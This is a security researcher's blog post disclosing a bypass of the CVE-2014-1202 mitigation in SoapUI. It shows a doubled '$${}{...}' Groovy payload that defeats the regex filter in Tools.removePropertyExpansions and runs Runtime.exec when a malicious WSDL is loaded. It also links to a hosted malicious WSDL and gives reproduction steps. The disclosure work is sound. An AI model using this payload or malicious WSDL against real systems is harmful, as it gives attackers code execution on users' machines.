# Arbitrary Code Injection Via Groovy Script Parser (SoapUI)


**Severity:** High

**Exploitability:** Medium

**Function:** XML/WSDL

Hello everyone,

In this blog, I will explain how I bypassed the mitigation for **CVE-2014-1202** using instrumentation.

While reviewing the **CVE-2014-1202** vulnerability, I noticed that in SoapUI, WSDL can be loaded from a URL or file. However, older versions of SoapUI do not have validation when loading XML/WSDL with a Groovy script, which can lead to a code injection issue.

---

### What is Groovy.

Groovy is **a scripting language for the Java platform**. It's a superset of Java, which means Java programs can run in the Groovy environment.

While Groovy can be a powerful tool, it is crucial to use it responsibly and securely. Always ensure that input validation and sanitization measures are in place to prevent code injection vulnerabilities.

---

To reproduce this issue, I attempted it with the latest version of SoapUI (5.7.2). 

You can download it from the following link: [**](https://www.soapui.org/downloads/latest-release/)https://www.soapui.org/downloads/latest-release/**

Also i did project setup and instrument using **Fusion Lite Project Manager.**

Download Malicious WSDL file of previous payload:  https://raw.githubusercontent.com/spookhorror/SOAPUICodeInjection/main/OLDWSDL.xml

To load WSDL please follow below step:
Click on SOAP and append endpoint of XML file. Click on “OK”

![image](https://github.com/spookhorror/Blogs/assets/67255423/5a9ef37f-3520-4d14-a939-7794ba50275f)

As we can see application is removing malicious content. Observe the logs.

```java
${=Runtime.getRuntime().exec('calc.exe')};
```
![image](https://github.com/spookhorror/Blogs/assets/67255423/6a06928f-619a-4108-af14-f45fb04986eb)
![image](https://github.com/spookhorror/Blogs/assets/67255423/1e461b97-8ece-4d81-a425-909c6e955829)

In **Fusion Lite Analyzer** we can see that application has Class called **Tools** which is responsible for removing malicious content because it has regex functionality which will remove malicious content.

![image](https://github.com/spookhorror/Blogs/assets/67255423/7d528050-6c32-4f6e-b203-d692a62eb83f)
![image](https://github.com/spookhorror/Blogs/assets/67255423/2db890e8-4e51-40e3-a667-94b21828bd0e)

After trying multiple methods to bypass regex, I have created a payload where the regex only removes a specific string payload

I.e

Old Payload
![image](https://github.com/spookhorror/Blogs/assets/67255423/beda9bdd-7f6f-4782-b381-73d69975a3b3)

New Payload
![image](https://github.com/spookhorror/Blogs/assets/67255423/a61d0b7c-6d73-43ec-b58c-a8b99aaae5c7)

```java
$${}{=Runtime.getRuntime().exec('calc.exe')}; to ${=Runtime.getRuntime().exec('calc.exe')};
​
```

As we can see, the regex matches only specific characters from the payload. Therefore, the method below will remove only a specific substring from the payload and return the actual payload.
```java
public static String removePropertyExpansions(String definitionUrl, String definition) {
        Matcher matcher = PROPERTY_EXPANSION_CONTAINS_PATTERN.matcher(definition);
        while (matcher.find()) {
            log.warn(messages.get("Tools.Warning.PropertyExpansionRemovedFromDefinition", definitionUrl, matcher.group()));
        }
        return matcher.replaceAll("");
    }
}


com.eviware.soapui.support.Tools : java.lang.String removePropertyExpansions(java.lang.String definitionUrl, java.lang.String definition)
​
```
We need to update payload in WSDL file and again load in SoapUI.
Updated XML:

![image](https://github.com/spookhorror/Blogs/assets/67255423/519aad05-e3e8-4fd4-9656-96096c7ad917)
![image](https://github.com/spookhorror/Blogs/assets/67255423/32e12d26-548b-4a93-af1b-4786574e5cbf)

Click on 'Send Request' and observe the execution of the calculator.

![image](https://github.com/spookhorror/Blogs/assets/67255423/219ad647-12d5-43bb-a678-57fa14fa27a3)

With updated payload we can see that below method has removed only this ${} content from payload and return updated string as.

Method:

```java
com.eviware.soapui.support.Tools : java.lang.String removePropertyExpansions(java.lang.String definitionUrl, java.lang.String definition)
```
![image](https://github.com/spookhorror/Blogs/assets/67255423/416aaab6-9ace-440f-abe1-3b36f406ef74)

Logs:
![image](https://github.com/spookhorror/Blogs/assets/67255423/53ea39b0-a44c-44db-8512-0252463551fc)

Updated string:

```java
$${}{=Runtime.getRuntime().exec('calc.exe')}; to ${=Runtime.getRuntime().exec('calc.exe')};
```

Here is updated content of request which contain malicious groovy script.
![image](https://github.com/spookhorror/Blogs/assets/67255423/a2927359-020a-483a-9c87-a522f3f33c3b)


The following method will execute a Groovy script that contains malicious code.

```java
groovy.lang.GroovyShell : groovy.lang.Script parse(java.lang.String)
```

![image](https://github.com/spookhorror/Blogs/assets/67255423/99fad30e-b7f8-45e7-8678-b1a36ae149f5)
